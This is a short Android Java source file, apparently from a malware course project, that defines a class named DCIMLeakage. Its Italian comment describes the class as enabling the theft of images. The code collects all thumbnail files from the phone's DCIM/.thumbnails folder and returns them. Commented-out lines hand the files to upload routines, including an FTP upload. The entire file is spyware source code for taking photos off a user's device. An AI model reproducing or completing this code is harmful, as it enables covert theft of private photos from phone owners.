package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Permette il furto delle immagini
 * DA CONSIDERARE: immagine full-size o scalata o thumbnail?
 */
public class DCIMLeakage {
    private static final String TAG = "DCIMLeakage";


    public File[] leak(Context context){
        // path to .thumbnails dir
        String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath()
                + "/.thumbnails/";

        // thumbnails directory
        File thumbnailsDir = new File(path);

        // get all thumbnails
        File[] thumbnails = thumbnailsDir.listFiles();

        // if there are some thumbnails, start to uplaod
        if ( thumbnails!=null && thumbnails.length>0 ){
            /*
            if(UploadData.getIstance(context).addFile("DCIM", thumbnails))
                Log.d(TAG, "Photos data added!");
            */
            return thumbnails;
            //FTP ftp = new FTP(context);
            //ftp.upload(thumbnails, "DCIM");
        }
        return null;
    }

}
